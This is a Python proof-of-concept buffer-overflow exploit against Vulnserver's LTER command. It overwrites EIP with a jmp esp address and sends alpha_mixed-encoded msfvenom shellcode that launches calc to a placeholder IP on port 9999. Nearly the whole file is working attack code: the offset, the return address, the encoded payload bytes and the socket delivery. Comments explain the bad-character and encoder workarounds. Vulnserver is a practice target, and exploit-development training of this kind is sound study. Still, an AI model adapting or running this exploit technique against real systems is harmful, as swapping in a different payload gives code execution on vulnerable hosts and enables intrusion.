#!/usr/bin/python3

# Vulnserver Buffer Overflow POC using LTER command and EIP overwrite

import subprocess
import struct
import socket

target_ip = "X.X.X.X"
target_port = 9999

def main():
    # prepend with command and slashes
    prepend = b"LTER /../"
    # jmp esp found at 0x62501203
    # large amount of bad characters restricts which addresses can be used
    eip = struct.pack("<I", 0x62501203)
    offset = 2003
    # msfvenom -p windows/exec CMD="calc" -f python -b "\x00" --encoder x86/alpha_mixed BufferRegister=ESP
    # any value in memory over 7f will have 7f subtracted from it, so 80 displays as 01, 81 as 02, etc
    # alpha_mixed encoder will restrict those characters from being used
    # BufferRegister=ESP will ensure characters at the beginning of the shellcode are within alpha_mixed limitations
    buf =  b""
    buf += b"\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    buf += b"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
    buf += b"\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    buf += b"\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    buf += b"\x6b\x4c\x39\x78\x4b\x32\x35\x50\x33\x30\x37\x70\x35"
    buf += b"\x30\x4d\x59\x4a\x45\x30\x31\x6f\x30\x30\x64\x4e\x6b"
    buf += b"\x76\x30\x74\x70\x4e\x6b\x33\x62\x54\x4c\x6e\x6b\x56"
    buf += b"\x32\x54\x54\x6c\x4b\x72\x52\x44\x68\x46\x6f\x58\x37"
    buf += b"\x53\x7a\x57\x56\x76\x51\x59\x6f\x6e\x4c\x37\x4c\x53"
    buf += b"\x51\x43\x4c\x36\x62\x36\x4c\x51\x30\x6f\x31\x38\x4f"
    buf += b"\x46\x6d\x75\x51\x68\x47\x78\x62\x6b\x42\x72\x72\x31"
    buf += b"\x47\x4e\x6b\x73\x62\x52\x30\x6c\x4b\x33\x7a\x67\x4c"
    buf += b"\x6c\x4b\x72\x6c\x47\x61\x70\x78\x6b\x53\x50\x48\x77"
    buf += b"\x71\x4e\x31\x76\x31\x4e\x6b\x46\x39\x31\x30\x75\x51"
    buf += b"\x78\x53\x4c\x4b\x37\x39\x77\x68\x78\x63\x64\x7a\x37"
    buf += b"\x39\x4e\x6b\x55\x64\x6e\x6b\x67\x71\x78\x56\x66\x51"
    buf += b"\x79\x6f\x4e\x4c\x6f\x31\x4a\x6f\x76\x6d\x33\x31\x6f"
    buf += b"\x37\x54\x78\x6b\x50\x72\x55\x6b\x46\x66\x63\x31\x6d"
    buf += b"\x4b\x48\x37\x4b\x61\x6d\x34\x64\x61\x65\x4b\x54\x53"
    buf += b"\x68\x6e\x6b\x53\x68\x75\x74\x76\x61\x6b\x63\x32\x46"
    buf += b"\x4c\x4b\x76\x6c\x32\x6b\x4e\x6b\x66\x38\x55\x4c\x37"
    buf += b"\x71\x68\x53\x4c\x4b\x47\x74\x6e\x6b\x75\x51\x5a\x70"
    buf += b"\x4f\x79\x71\x54\x44\x64\x44\x64\x53\x6b\x53\x6b\x31"
    buf += b"\x71\x56\x39\x70\x5a\x53\x61\x69\x6f\x69\x70\x71\x4f"
    buf += b"\x53\x6f\x52\x7a\x4e\x6b\x44\x52\x7a\x4b\x6c\x4d\x31"
    buf += b"\x4d\x62\x4a\x73\x31\x6e\x6d\x6d\x55\x58\x32\x57\x70"
    buf += b"\x53\x30\x35\x50\x56\x30\x65\x38\x74\x71\x4c\x4b\x32"
    buf += b"\x4f\x4c\x47\x6b\x4f\x69\x45\x6d\x6b\x7a\x50\x6e\x55"
    buf += b"\x39\x32\x42\x76\x33\x58\x4d\x76\x6e\x75\x4d\x6d\x6d"
    buf += b"\x4d\x79\x6f\x79\x45\x65\x6c\x54\x46\x51\x6c\x56\x6a"
    buf += b"\x4f\x70\x4b\x4b\x79\x70\x64\x35\x66\x65\x6f\x4b\x73"
    buf += b"\x77\x66\x73\x52\x52\x50\x6f\x71\x7a\x67\x70\x52\x73"
    buf += b"\x6b\x4f\x69\x45\x32\x43\x75\x31\x72\x4c\x33\x53\x77"
    buf += b"\x70\x41\x41"

    attack_string = prepend + (b"A"*offset) + eip + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    response = s.recv(2048)
    print(response.decode())
    s.send(attack_string)
    s.close()

if __name__ == "__main__":
    main()
